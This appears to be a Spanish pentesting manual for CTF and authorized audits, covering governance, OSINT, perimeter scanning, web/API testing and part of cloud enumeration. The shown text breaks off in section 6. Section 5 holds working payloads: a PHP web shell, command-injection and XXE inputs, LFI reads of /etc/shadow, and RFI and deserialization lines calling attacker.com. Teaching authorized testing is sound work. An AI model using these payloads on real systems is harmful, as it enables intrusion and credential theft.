# Manual Definitivo de Pentesting — CTF + Auditoría

[![License: MIT](https://img.shields.io/badge/License-yellow.svg)](https://opensource.org/licenses/)
[![Security](https://img.shields.io/badge/Security-Pentesting-red.svg)](https://github.com/topics/penetration-testing)
[![Platform](https://img.shields.io/badge/Platform-Linux-blue.svg)](https://www.linux.org/)

**Autora:** Zyanetralys (alias "Zyanetralys")  
**Ámbito:** CTF / Red externa / Red interna / Web & APIs / Cloud / Móvil / Wireless / IoT/OT / Ingeniería Social / Physical  
**Norma de oro:** Siempre con **autorización por escrito**, **ROE** claras y controles de seguridad.

---

## ⚠️ Advertencia Legal y Ética

> **IMPORTANTE:** Este manual está diseñado únicamente para pentesting autorizado, auditorías de seguridad con consentimiento expreso y entornos CTF/laboratorio. El uso indebido de estas técnicas sin autorización es ilegal y éticamente incorrecto. El autor no se hace responsable del mal uso de esta información.

---

## 📑 Tabla de Contenidos

- [0. Gobierno, Legalidad y Seguridad Operacional](#0-gobierno-legalidad-y-seguridad-operacional)
- [1. Preparación del Entorno de Trabajo](#1-preparación-del-entorno-de-trabajo)
- [2. Plan de Test y Modelado de Amenazas](#2-plan-de-test-y-modelado-de-amenazas)
- [3. Reconocimiento Pasivo (OSINT & Footprinting)](#3-reconocimiento-pasivo-osint--footprinting)
- [4. Perímetro Externo (Internet-Facing)](#4-perímetro-externo-internet-facing)
- [5. Aplicaciones Web y APIs](#5-aplicaciones-web-y-apis)
- [6. Cloud (AWS/Azure/GCP/OCI/SaaS)](#6-cloud-awsazuregcpocisaas)
- [7. Red Interna (Assumed-Breach)](#7-red-interna-assumed-breach)
- [8. Wireless & Radio](#8-wireless--radio)
- [9. Móvil (Android/iOS)](#9-móvil-androidios)
- [10. IoT / OT / Hardware](#10-iot--ot--hardware)
- [11. Ingeniería Social](#11-ingeniería-social)
- [12. Physical Security](#12-physical-security)
- [13. Post-Exposición](#13-post-exposición)
- [14. Resiliencia y Purple Team](#14-resiliencia-y-purple-team)
- [15. Limpieza y Restauración](#15-limpieza-y-restauración)
- [16. Reporte y Remediación](#16-reporte-y-remediación)
- [17. Retest y Verificación](#17-retest-y-verificación)
- [18. Lecciones Aprendidas](#18-lecciones-aprendidas)
- [19. Apéndices](#19-apéndices)

---

## 0. Gobierno, Legalidad y Seguridad Operacional

**Objetivo:** Garantizar que todas las acciones de pentesting se realicen dentro del marco legal y operativo seguro, protegiendo al equipo y al cliente.

### 0.1 Autorizaciones formales

```bash
mkdir -p 00_preparacion
touch 00_preparacion/autorizaciones.txt

echo "Contrato revisado: Alcance completo, IPs, dominios, aplicaciones, servicios" >> 00_preparacion/autorizaciones.txt
echo "Firmas de cliente y responsables legales confirmadas" >> 00_preparacion/autorizaciones.txt
echo "Fechas y ventanas de prueba validadas y coordinadas con NOC/SOC" >> 00_preparacion/autorizaciones.txt
```

### 0.2 ROE (Rules of Engagement)

```bash
echo "ROE: solo pruebas autorizadas, no exfiltrar datos reales, alertar inmediatamente ante incidente crítico" >> 00_preparacion/roe.txt
echo "Niveles de intrusión permitidos: externo, interno, social, físico" >> 00_preparacion/roe.txt
```

### 0.3 Coordinación con Blue Team / Proveedores / NOC/SOC

```bash
echo "Contacto SOC: soc@cliente.com, teléfono de emergencia 24/7, protocolo de parada activo" >> 00_preparacion/comunicacion.txt
echo "Canales seguros de comunicación establecidos: Slack/Teams/Signal" >> 00_preparacion/comunicacion.txt
echo "Reglas de interacción, reportes automáticos y alertas definidas" >> 00_preparacion/comunicacion.txt
```

### 0.4 Gestión de riesgos

```bash
mkdir -p 00_preparacion/backups
cp /ruta/importante/* 00_preparacion/backups/
echo "Rollback listo ante cualquier interrupción" >> 00_preparacion/backups/plan.txt
echo "Criterios de priorización y escalamiento de incidentes establecidos" >> 00_preparacion/backups/plan.txt
```

### 0.5 Evidencias y cadena de custodia

```bash
find . -type f -exec sha256sum {} \; >> 00_preparacion/evidencias_hash.txt
echo "Fecha,Hora,Accion,Comando,Resultado" > 00_preparacion/evidencias.csv
```

### 0.6 Ética, privacidad y cumplimiento

```bash
gpg --symmetric --cipher-algo AES256 00_preparacion/evidencias.csv
echo "Cumplimiento normativo confirmado: RGPD, PCI, HIPAA, ISO 27001, NIST" >> 00_preparacion/evidencias.csv
echo "Manejo de PII: minimización, cifrado, borrado seguro" >> 00_preparacion/evidencias.csv
```

### 0.7 Seguridad personal y del cliente

```bash
export SECRET_PASS="valor_super_secreto"
echo $SECRET_PASS | gpg --symmetric --cipher-algo AES256 > 00_preparacion/secret.gpg
echo "Uso de entornos aislados: VMs, contenedores, VPN dedicadas" >> 00_preparacion/entorno.txt
echo "Prohibiciones claras y criterios de parada inmediata definidos" >> 00_preparacion/entorno.txt
```

### ✅ Checklist Punto 0

```
[ ] Contrato revisado y firmado
[ ] ROE documentado
[ ] Canales de comunicación establecidos
[ ] Plan de contingencia creado
[ ] Evidencias y hashes listos
[ ] Cumplimiento normativo confirmado
[ ] Seguridad personal y del cliente definida
```

---

## 1. Preparación del Entorno de Trabajo

**Objetivo:** Configurar un laboratorio seguro y controlado, con herramientas, perfiles y registros listos para pentesting.

### 1.1 Plataforma de pruebas

```bash
mkdir -p 01_entorno/so
echo "SO base: Kali Linux / Parrot OS / Windows Lab VM" >> 01_entorno/so/config.txt
echo "VMs adicionales para contenedores y simulación de servidores" >> 01_entorno/so/config.txt
echo "Segmentación de laboratorio implementada: VLANs/Redes virtuales separadas" >> 01_entorno/so/config.txt
```

### 1.2 Redes de prueba

```bash
echo "VPN de laboratorio establecida" >> 01_entorno/red/config.txt
echo "Jump-box configurado para acceso controlado" >> 01_entorno/red/config.txt
echo "DNS controlado y logging centralizado activo" >> 01_entorno/red/config.txt
echo "Proxy de pruebas habilitado y filtrado de tráfico registrado" >> 01_entorno/red/config.txt
```

### 1.3 Perfiles y roles

```bash
echo "Roles definidos: caja negra / gris / blanca" >> 01_entorno/roles.txt
echo "Credenciales temporales gestionadas y registradas" >> 01_entorno/roles.txt
echo "Accesos y permisos documentados" >> 01_entorno/roles.txt
```

### 1.4 Herramientas y toolchains

```bash
mkdir -p 01_entorno/tools/{recon_pasivo,mapa_red,servicios,web_api,movil,cloud,wi_fi,ad,contenedores,forense_ligero}
echo "Herramientas organizadas por categorías en 01_entorno/tools/" >> 01_entorno/tools/config.txt
```

#### Herramientas Recomendadas por Categoría

| Categoría | Herramientas |
|-----------|-------------|
| **Reconocimiento** | `amass`, `sublist3r`, `theHarvester`, `maltego`, `recon-ng` |
| **Escaneo de Red** | `nmap`, `masscan`, `zmap`, `unicornscan` |
| **Web/API** | `burpsuite`, `owasp-zap`, `sqlmap`, `gobuster`, `ffuf`, `nikto` |
| **Cloud** | `aws-cli`, `azure-cli`, `gcloud`, `prowler`, `scout-suite` |
| **AD/Windows** | `bloodhound`, `impacket`, `crackmapexec`, `powerview`, `mimikatz` |
| **Wireless** | `aircrack-ng`, `kismet`, `reaver`, `bully` |
| **Móvil** | `apktool`, `frida`, `objection`, `mobsf` |
| **Forense** | `volatility`, `autopsy`, `sleuthkit`, `binwalk` |

### 1.5 OPSEC

```bash
echo "Aislamiento de entornos activo: no usar credenciales reales fuera del lab" >> 01_entorno/opsec.txt
echo "Control de secretos: variables de entorno cifradas" >> 01_entorno/opsec.txt
echo "Telemetría y registro de acciones habilitados" >> 01_entorno/opsec.txt

export SECRET_TOOL_PASS="valor_super_secreto_lab"
echo $SECRET_TOOL_PASS | gpg --symmetric --cipher-algo AES256 > 01_entorno/opsec/secret.gpg
```

### 1.6 Plantillas base

```bash
mkdir -p 01_entorno/plantillas
echo "Plantilla cuaderno de pruebas lista" >> 01_entorno/plantillas/cuaderno.md
echo "Checklist por dominio creada" >> 01_entorno/plantillas/checklist.md
echo "Formato de evidencia y reporte preparado" >> 01_entorno/plantillas/evidencia.md
```

### ✅ Checklist Punto 1

```
[ ] SO base y VMs listas
[ ] Redes de laboratorio configuradas
[ ] Roles y credenciales definidos
[ ] Toolchains organizadas
[ ] OPSEC implementado
[ ] Plantillas base listas
```

---

## 2. Plan de Test y Modelado de Amenazas

**Objetivo:** Definir objetivos claros de auditoría, escenarios de ataque y métricas de éxito antes de ejecutar cualquier prueba.

### 2.1 Objetivos de negocio y hipótesis de ataque

```bash
mkdir -p 02_plan_test
echo "Identificar activos críticos y crown jewels" >> 02_plan_test/objetivos.txt
echo "Hipótesis de ataque: externo, interno, social, físico, cloud, aplicaciones" >> 02_plan_test/hipotesis.txt
echo "Priorizar pruebas según impacto al negocio y criticidad de activos" >> 02_plan_test/prioridad.txt
```

### 2.2 Modelos de amenaza

```bash
echo "STRIDE: Spoofing, Tampering, Repudiation, Information Disclosure, Denial, Elevation" >> 02_plan_test/modelos.txt
echo "MITRE ATT&CK: mapear técnicas posibles a activos identificados" >> 02_plan_test/modelos.txt
echo "CAPEC: patrones de ataque comunes para simular escenarios realistas" >> 02_plan_test/modelos.txt
```

### 2.3 Definición de escenarios

```bash
echo "Escenarios externos: internet-facing, web, APIs, VPN" >> 02_plan_test/escenarios.txt
echo "Escenarios internos: red interna, segmentación, AD, SMB, bases de datos" >> 02_plan_test/escenarios.txt
echo "Wireless: pruebas Wi-Fi/BLE autorizadas, portales cautivos" >> 02_plan_test/escenarios.txt
echo "Cloud: AWS/Azure/GCP/SaaS, buckets, IAM, serverless, contenedores" >> 02_plan_test/escenarios.txt
echo "Social Engineering: phishing, vishing, simulación controlada (solo si está autorizado)" >> 02_plan_test/escenarios.txt
echo "Physical: acceso físico, validación de controles, CCTV, visitantes (solo si autorizado)" >> 02_plan_test/escenarios.txt
```

### 2.4 KPIs/KRIs y criterios de éxito

```bash
echo "KPIs: tiempo de descubrimiento de vulnerabilidades, % de activos explorados, hallazgos críticos detectados" >> 02_plan_test/kpi.txt
echo "KRIs: incidentes no planeados, alertas falsas, impacto mínimo al negocio" >> 02_plan_test/kri.txt
echo "Definir criterios de éxito: hallazgos validados, documentación completa, sin daños no autorizados" >> 02_plan_test/kpi.txt
```

### 2.5 Plan de comunicación

```bash
mkdir -p 02_plan_test/comunicacion
echo "Incidentes críticos: reportar inmediatamente a SOC/NOC y responsable legal" >> 02_plan_test/comunicacion/alertas.txt
echo "Hallazgos menores: documentar en cuaderno de pruebas, revisar en reuniones diarias" >> 02_plan_test/comunicacion/alertas.txt
echo "Canales seguros: Slack/Teams/Signal (según política cliente)" >> 02_plan_test/comunicacion/canales.txt
```

### ✅ Checklist Punto 2

```
[ ] Objetivos de negocio definidos
[ ] Hipótesis de ataque documentadas
[ ] Modelos de amenaza aplicados (STRIDE, MITRE, CAPEC)
[ ] Escenarios de prueba definidos
[ ] KPIs/KRIs establecidos
[ ] Plan de comunicación preparado
```

---

## 3. Reconocimiento Pasivo (OSINT & Footprinting)

**Objetivo:** Obtener la máxima información pública y de terceros sobre los objetivos sin interactuar directamente con sus sistemas.

### 3.1 Inventario de superficie pública

```bash
mkdir -p 03_recon_pasivo
echo "Registrar dominios, subdominios, IPs públicas, ASN y rangos asociados" >> 03_recon_pasivo/inventario.txt
echo "Registrar servicios expuestos documentados por terceros" >> 03_recon_pasivo/inventario.txt
```

### 3.2 DNS/CT y WHOIS

```bash
# WHOIS básico
whois dominio.com > 03_recon_pasivo/whois.txt

# DNS histórico y logs de certificados
curl -s "https://crt.sh/?q=dominio.com&output=json" | jq '.[].name_value' | sort -u > 03_recon_pasivo/ct_logs.txt

# NSLookup y Dig avanzado
nslookup dominio.com >> 03_recon_pasivo/dns.txt
dig dominio.com ANY +noall +answer >> 03_recon_pasivo/dns.txt
dig axfr dominio.com @ns.dominio.com >> 03_recon_pasivo/zone_transfer.txt
```

### 3.3 Enumeración de subdominios

```bash
# Sublist3r
sublist3r -d dominio.com -o 03_recon_pasivo/sublist3r.txt

# Amass
amass enum -d dominio.com -passive -o 03_recon_pasivo/amass.txt

# Subfinder
subfinder -d dominio.com -o 03_recon_pasivo/subfinder.txt

# Assetfinder
assetfinder --subs-only dominio.com > 03_recon_pasivo/assetfinder.txt

# Combinar y limpiar resultados
cat 03_recon_pasivo/{sublist3r,amass,subfinder,assetfinder}.txt | sort -u > 03_recon_pasivo/subdominios_unicos.txt
```

### 3.4 Huella tecnológica

```bash
# Whatweb
whatweb dominio.com >> 03_recon_pasivo/huella.txt

# Wappalyzer
wappalyzer-cli dominio.com >> 03_recon_pasivo/huella.txt

# Builtwith alternative
curl -s "https://api.builtwith.com/domain-api?KEY=API_KEY&LOOKUP=dominio.com" | jq . >> 03_recon_pasivo/builtwith.txt
```

### 3.5 Exposición de datos

```bash
# theHarvester
theHarvester -d dominio.com -b all -l 500 -f 03_recon_pasivo/harvester.html

# GitDorker (solo en repos públicos autorizados)
echo "Repositorios públicos y fugas históricas: GitHub, GitLab, pastebin" >> 03_recon_pasivo/datos.txt
echo "Buscar leaks simulados en entornos de laboratorio autorizados" >> 03_recon_pasivo/datos.txt

# Sherlock (para perfiles de usuario)
sherlock username_objetivo --output 03_recon_pasivo/sherlock.txt
```

### 3.6 Google Dorking (Información Pública)

```bash
# Ejemplos de dorks (solo información pública)
echo 'site:dominio.com filetype:pdf' >> 03_recon_pasivo/google_dorks.txt
echo 'site:dominio.com inurl:admin' >> 03_recon_pasivo/google_dorks.txt
echo 'site:dominio.com intitle:"index of"' >> 03_recon_pasivo/google_dorks.txt
echo '"dominio.com" password OR credential OR key' >> 03_recon_pasivo/google_dorks.txt
```

### 3.7 Shodan y Censys

```bash
# Shodan search (API key requerida)
shodan search "hostname:dominio.com" --fields ip_str,port,data > 03_recon_pasivo/shodan.txt

# Censys search alternativo
echo "Registrar servicios expuestos en Censys y Shodan" >> 03_recon_pasivo/shodan_censys.txt
```

### ✅ Checklist Punto 3

```
[ ] Inventario de superficie pública completo
[ ] WHOIS, DNS y logs de certificados revisados
[ ] Subdominios enumerados y validados
[ ] Huella tecnológica identificada
[ ] Exposición de datos documentada
[ ] Google Dorking realizado
[ ] Shodan/Censys consultado
[ ] Límites legales verificados
```

---

## 4. Perímetro Externo (Internet-Facing)

**Objetivo:** Evaluar los sistemas accesibles desde Internet, identificar servicios expuestos, configuraciones inseguras y posibles vectores de ataque.

### 4.1 Descubrimiento de hosts y servicios

```bash
mkdir -p 04_perimetro_externo

# Nmap escaneo completo
nmap -p- -T4 --open IP_DEL_OBJETIVO -oN 04_perimetro_externo/puertos_abiertos.txt

# Masscan para escaneo rápido
masscan IP_DEL_OBJETIVO -p1-65535 --rate 1000 -oG 04_perimetro_externo/masscan.txt

# Zmap para rangos grandes (cuidado con rate-limits)
zmap -p 80 IP_RANGE/24 -o 04_perimetro_externo/zmap_80.txt
```

### 4.2 Fingerprinting de servicios

```bash
# Nmap detallado con scripts
nmap -sV -sC -p$(cat 04_perimetro_externo/puertos_abiertos.txt | grep "open" | cut -d'/' -f1 | tr '\n' ',') IP_DEL_OBJETIVO -oN 04_perimetro_externo/fingerprinting.txt

# Banner grabbing manual
nc -nv IP_DEL_OBJETIVO 80
nc -nv IP_DEL_OBJETIVO 22
nc -nv IP_DEL_OBJETIVO 25

# Whatweb para servicios web
whatweb http://IP_DEL_OBJETIVO >> 04_perimetro_externo/fingerprinting.txt

# Nikto para vulnerabilidades web
nikto -h http://IP_DEL_OBJETIVO >> 04_perimetro_externo/fingerprinting.txt
```

### 4.3 Evaluación de configuraciones específicas

```bash
# SSH
ssh -v usuario@IP_DEL_OBJETIVO 2>&1 | head -20 > 04_perimetro_externo/ssh_config.txt

# DNS Zone Transfer
dig @IP_DEL_OBJETIVO dominio.com AXFR >> 04_perimetro_externo/zone_transfer.txt

# SMTP
telnet IP_DEL_OBJETIVO 25
# HELO test
# VRFY root
# EXPN admin

# RDP
nmap --script rdp-enum-encryption -p 3389 IP_DEL_OBJETIVO
```

### 4.4 Análisis de TLS y políticas de seguridad

```bash
# SSLScan
sslscan IP_DEL_OBJETIVO:443 > 04_perimetro_externo/sslscan.txt

# TestSSL
testssl.sh https://IP_DEL_OBJETIVO >> 04_perimetro_externo/testssl.txt

# Nmap SSL scripts
nmap --script ssl-enum-ciphers,ssl-cert,ssl-date -p 443 IP_DEL_OBJETIVO -oN 04_perimetro_externo/nmap_ssl.txt

# Verificar headers de seguridad
curl -I https://IP_DEL_OBJETIVO | grep -i "security\|hsts\|csp\|x-frame"
```

### 4.5 Identificación de superficies administrativas

```bash
# Gobuster
gobuster dir -u http://IP_DEL_OBJETIVO -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,jsp -o 04_perimetro_externo/gobuster.txt

# Dirsearch
dirsearch -u http://IP_DEL_OBJETIVO -e php,html,js,txt,jsp --random-agent -o 04_perimetro_externo/dirsearch.txt

# FFuf
ffuf -u http://IP_DEL_OBJETIVO/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -o 04_perimetro_externo/ffuf.json

# Directorios administrativos comunes
curl -I http://IP_DEL_OBJETIVO/admin
curl -I http://IP_DEL_OBJETIVO/phpmyadmin
curl -I http://IP_DEL_OBJETIVO/wp-admin
curl -I http://IP_DEL_OBJETIVO/cpanel
```

### 4.6 Validación de exposición indebida

```bash
# Archivos de backup y configuración
curl -I http://IP_DEL_OBJETIVO/backup.zip
curl -I http://IP_DEL_OBJETIVO/config.php.bak
curl -I http://IP_DEL_OBJETIVO/.env
curl -I http://IP_DEL_OBJETIVO/.git/config
curl -I http://IP_DEL_OBJETIVO/web.config

# Robots.txt y sitemap
curl http://IP_DEL_OBJETIVO/robots.txt
curl http://IP_DEL_OBJETIVO/sitemap.xml

# Archivos de logs expuestos
curl -I http://IP_DEL_OBJETIVO/error.log
curl -I http://IP_DEL_OBJETIVO/access.log
```

### 4.7 Evaluación de contramedidas

```bash
# Detección de WAF
nmap --script http-waf-detect,http-waf-fingerprint -p 80,443 IP_DEL_OBJETIVO >> 04_perimetro_externo/waf.txt

# Rate limiting tests
for i in {1..20}; do curl -I http://IP_DEL_OBJETIVO/ -w "%{http_code}\n" -o /dev/null -s; done

# IP reputation check
whois IP_DEL_OBJETIVO | grep -i "abuse\|spam\|blocked"
```

### ✅ Checklist Punto 4

```
[ ] Hosts descubiertos y servicios enumerados
[ ] Fingerprinting completado
[ ] Configuraciones específicas revisadas
[ ] TLS y políticas de seguridad analizadas
[ ] Superficies administrativas identificadas
[ ] Exposición indebida documentada
[ ] Contramedidas evaluadas
[ ] Vectores priorizados para pruebas controladas
```

---

## 5. Aplicaciones Web y APIs

**Objetivo:** Evaluar exhaustivamente la seguridad de aplicaciones web y APIs, identificando vulnerabilidades críticas según OWASP Top 10 y metodologías avanzadas.

### 5.1 Mapeo funcional y de contenido

```bash
mkdir -p 05_web_api

# Gobuster con extensiones
gobuster dir -u http://IP_DEL_OBJETIVO -w /usr/share/wordlists/dirb/common.txt -x php,asp,aspx,jsp,html,txt -o 05_web_api/gobuster.txt

# Dirsearch con user-agents
dirsearch -u http://IP_DEL_OBJETIVO -e php,html,js,txt,asp,aspx,jsp --random-agent -t 50 -o 05_web_api/dirsearch.txt

# Feroxbuster (rust-based, muy rápido)
feroxbuster -u http://IP_DEL_OBJETIVO -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,js,txt -t 50 -o 05_web_api/ferox.txt

# OWASP ZAP spider automatizado
zaproxy -cmd -port 8080 -quickurl http://IP_DEL_OBJETIVO -quickout 05_web_api/zap_spider.xml
```

### 5.2 Autenticación y gestión de sesión

```bash
# Hydra para bruteforce controlado
hydra -L usuarios.txt -P passwords.txt http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" IP_DEL_OBJETIVO -t 16 -o 05_web_api/hydra.txt

# Medusa alternativo
medusa -h IP_DEL_OBJETIVO -U usuarios.txt -P passwords.txt -M http -m DIR:/login -T 10

# JWT analysis
echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." | base64 -d > 05_web_api/jwt_decoded.json
jwt_tool token.jwt -C -d secrets.txt

# Cookie analysis
curl -c 05_web_api/cookies.txt -b 05_web_api/cookies.txt http://IP_DEL_OBJETIVO/login
```

### 5.3 Control de acceso e IDOR

```bash
# IDOR testing
curl -X GET http://IP_DEL_OBJETIVO/api/users/1 -H "Authorization: Bearer TOKEN" >> 05_web_api/idor_test.txt
curl -X GET http://IP_DEL_OBJETIVO/api/users/2 -H "Authorization: Bearer TOKEN" >> 05_web_api/idor_test.txt

# Autorization Bypass
curl -X GET http://IP_DEL_OBJETIVO/admin/panel -H "X-Forwarded-For: 127.0.0.1"
curl -X GET http://IP_DEL_OBJETIVO/admin/panel -H "X-Real-IP: 127.0.0.1"
curl -X GET http://IP_DEL_OBJETIVO/admin/panel -H "X-Originating-IP: 127.0.0.1"
```

### 5.4 Inyecciones (SQL, NoSQL, LDAP, OS, XXE)

```bash
# SQLMap completo
sqlmap -u "http://IP_DEL_OBJETIVO/page.php?id=1" --batch --level=5 --risk=3 --dbs --threads=10 -o 05_web_api/sqlmap/

# SQLMap con forms
sqlmap -u "http://IP_DEL_OBJETIVO/login" --data="username=admin&password=test" --batch --dbs

# NoSQL Injection
curl -X POST http://IP_DEL_OBJETIVO/api/users -H "Content-Type: application/json" -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# LDAP Injection
curl "http://IP_DEL_OBJETIVO/search?user=admin)(&)(objectClass=*"

# OS Command Injection
curl -X POST http://IP_DEL_OBJETIVO/ping -d "host=127.0.0.1;whoami"
curl -X POST http://IP_DEL_OBJETIVO/ping -d "host=127.0.0.1|id"
curl -X POST http://IP_DEL_OBJETIVO/ping -d "host=127.0.0.1`uname -a`"

# XXE Injection
cat > xxe_payload.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
EOF

curl -X POST http://IP_DEL_OBJETIVO/xml -H "Content-Type: application/xml" -d @xxe_payload.xml
```

### 5.5 Subida de archivos y path traversal

```bash
# File Upload testing
echo '<?php system($_GET["cmd"]); ?>' > 05_web_api/shell.php
curl -F "file=@05_web_api/shell.php" http://IP_DEL_OBJETIVO/upload

# Image upload bypass
echo '<?php system($_GET["cmd"]); ?>' > 05_web_api/shell.php.jpg
curl -F "file=@05_web_api/shell.php.jpg" http://IP_DEL_OBJETIVO/upload

# Path Traversal / LFI
curl "http://IP_DEL_OBJETIVO/page.php?file=../../etc/passwd"
curl "http://IP_DEL_OBJETIVO/page.php?file=../../etc/shadow"
curl "http://IP_DEL_OBJETIVO/page.php?file=../../var/log/apache2/access.log"
curl "http://IP_DEL_OBJETIVO/page.php?file=../../windows/system32/drivers/etc/hosts"

# RFI (Remote File Inclusion)
curl "http://IP_DEL_OBJETIVO/page.php?file=http://attacker.com/shell.txt"

# Log Poisoning
curl "http://IP_DEL_OBJETIVO/page.php?file=../../var/log/apache2/access.log" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

### 5.6 XSS y CSRF

```bash
# XSS Reflected
curl "http://IP_DEL_OBJETIVO/search?q=<script>alert('XSS')</script>"
curl "http://IP_DEL_OBJETIVO/search?q=<img src=x onerror=alert('XSS')>"

# XSS Stored
curl -X POST http://IP_DEL_OBJETIVO/comment -d "message=<script>alert('Stored XSS')</script>"

# XSS DOM-based
curl "http://IP_DEL_OBJETIVO/page#<img src=x onerror=alert('DOM XSS')>"

# XSStrike automated
xsstrike -u "http://IP_DEL_OBJETIVO/search?q=test" --crawl -l 2

# Dalfox XSS scanner
dalfox url "http://IP_DEL_OBJETIVO/search?q=test" -o 05_web_api/dalfox.txt

# CSRF testing
cat > csrf_poc.html << 'EOF'
<form action="http://IP_DEL_OBJETIVO/admin/delete" method="POST">
    <input type="hidden" name="id" value="1">
    <input type="submit" value="Click me">
</form>
EOF
```

### 5.7 APIs REST/SOAP/GraphQL

```bash
# API Discovery
gobuster dir -u http://IP_DEL_OBJETIVO -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -o 05_web_api/api_endpoints.txt

# REST API fuzzing
ffuf -u http://IP_DEL_OBJETIVO/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,400,401,403,500

# GraphQL introspection
curl -X POST http://IP_DEL_OBJETIVO/graphql -H "Content-Type: application/json" -d '{"query": "query IntrospectionQuery { __schema { queryType { name } } }"}'

# SOAP service discovery
curl -X POST http://IP_DEL_OBJETIVO/soap -H "Content-Type: text/xml" -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body></soap:Body></soap:Envelope>'

# API versioning tests
curl http://IP_DEL_OBJETIVO/api/v1/users
curl http://IP_DEL_OBJETIVO/api/v2/users
curl http://IP_DEL_OBJETIVO/api/users

# Rate limiting bypass
for i in {1..100}; do curl -H "X-Forwarded-For: 192.168.1.$i" http://IP_DEL_OBJETIVO/api/endpoint; done
```

### 5.8 WebSockets y protocolos modernos

```bash
# WebSocket testing
wscat -c ws://IP_DEL_OBJETIVO/socket
echo '{"type":"auth","token":"test"}' | wscat -c ws://IP_DEL_OBJETIVO/socket

# HTTP/2 testing
curl --http2 -v https://IP_DEL_OBJETIVO

# Server-Sent Events
curl -N -H "Accept: text/event-stream" http://IP_DEL_OBJETIVO/events
```

### 5.9 Template Injection

```bash
# Jinja2/Flask
curl -X POST http://IP_DEL_OBJETIVO/template -d "name={{7*7}}"
curl -X POST http://IP_DEL_OBJETIVO/template -d "name={{config}}"
curl -X POST http://IP_DEL_OBJETIVO/template -d "name={{''.__class__.__mro__[2].__subclasses__()}}"

# Twig/Symfony
curl -X POST http://IP_DEL_OBJETIVO/template -d "name={{7*7}}"
curl -X POST http://IP_DEL_OBJETIVO/template -d "name={{_self.env.getRuntime('Twig\\Runtime\\EscaperRuntime')}}"

# Smarty
curl -X POST http://IP_DEL_OBJETIVO/template -d "name={7*7}"
curl -X POST http://IP_DEL_OBJETIVO/template -d "name={php}phpinfo(){/php}"
```

### 5.10 Deserialización insegura

```bash
# PHP Object Injection
echo 'O:8:"stdClass":1:{s:4:"test";s:4:"data";}' | base64 > 05_web_api/php_payload.txt
curl -X POST http://IP_DEL_OBJETIVO/unserialize -d "data=$(cat 05_web_api/php_payload.txt)"

# Java Deserialization
java -jar ysoserial.jar CommonsCollections1 'ping attacker.com' > 05_web_api/java_payload.ser
curl -X POST http://IP_DEL_OBJETIVO/deserialize --data-binary @05_web_api/java_payload.ser
```

### ✅ Checklist Punto 5

```
[ ] Mapeo funcional y de contenido completo
[ ] Autenticación y gestión de sesión evaluadas
[ ] Control de acceso e IDOR verificados
[ ] Inyecciones (SQL, NoSQL, LDAP, OS, XXE) probadas
[ ] Subida de archivos y path traversal evaluados
[ ] XSS y CSRF identificados
[ ] APIs REST/SOAP/GraphQL auditadas
[ ] WebSockets y protocolos modernos probados
[ ] Template injection verificado
[ ] Deserialización insegura evaluada
[ ] Headers de seguridad analizados
[ ] Lógica de negocio revisada
```

---

## 6. Cloud (AWS/Azure/GCP/OCI/SaaS)

**Objetivo:** Evaluar la seguridad de entornos cloud de manera exhaustiva, incluyendo configuraciones, permisos, datos y servicios.

### 6.1 Descubrimiento de activos cloud

```bash
mkdir -p 06_cloud

# AWS S3 Bucket Discovery
aws s3 ls --profile target-profile
aws s3 ls s3://bucket-name --no-sign-request
aws s3api get-bucket-acl --bucket bucket-name

# Google Cloud Storage
gsutil ls
gsutil ls gs://bucket-name
gsutil iam get gs://bucket-name

# Azure Blob Storage
az storage blob list --account-name myaccount --container-name mycontainer
az storage container list --account-name myaccount

# S3 Bucket enumeration tools
s3scanner -f bucket_names.txt
bucket_finder.rb wordlist.txt
```

### 6.2 Revisión de identidades y permisos (IAM)

```bash
# AWS IAM
aws iam list-users --profile target-profile > 06_cloud/aws_users.json
aws iam list-roles --profile target-profile > 06_cloud/aws_roles.json
aws iam list-policies --scope Local --profile target-profile > 06_cloud/aws_policies.json
aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::ACCOUNT:role/ROLE --action-names s3:* ec2:* --profile target-profile

# Azure RBAC
az role assignment list --all > 06_cloud/azure_roles.json
az ad user list > 06_cloud/azure_users.json
az ad group list > 06_cloud/azure_groups.json

# GCP IAM
gcloud projects get-iam-policy PROJECT_ID > 06_cloud/gcp_iam.json
gcloud iam service-accounts list > 06_cloud/gcp_service_accounts.json
```

### 6.3 Seguridad de datos

```bash
# AWS S3 encryption and versioning
aws s3api get-bucket-encryption --bucket bucket-name
aws s3api get-bucket-versioning --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name

# Azure storage encryption
az storage account show --name myaccount --resource-group mygroup --query encryption

# GCP storage security
gsutil lifecycle get gs://bucket-name
gsutil versioning get gs://bucket-name
```

### 6.4 Compute y serverless

```bash
# AWS EC2 and Lambda
aws ec2 describe-instances --profile target-profile > 06_cloud/ec2_instances.json
aws lambda list-functions --profile target-profile > 06_cloud/lambda_functions.json
aws lambda get-function --function-name function-name --profile target-profile

# Azure VMs and Functions
az vm list > 06_cloud/azure_vms.json
az functionapp list > 06_cloud/azure_functions.json

# GCP Compute and Functions
gcloud compute instances list > 06_cloud/gcp_instances.txt
gcloud functions list > 06_cloud/gcp_functions.txt

# Metadata service enumeration (from compromised instance)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/computeMetadata/v1/instance/ -H "Metadata-Flavor: Google"
curl http://169.254.169.254/metadata/instance -H "Metadata: true"
```

### 6.5 Redes y perímetros

```bash
# AWS Security Groups and VPCs
aws ec2 describe-security-groups --profile target-profile > 06_cloud/aws_security_groups.json
aws ec2 describe-vpcs --profile target-profile > 06_cloud/aws_vpcs.json
aws ec2 describe-network-acls --profile target-profile > 06_cloud/aws_nacls.json

# Azure Network Security Groups
az network nsg list > 06_cloud/azure_nsgs.json
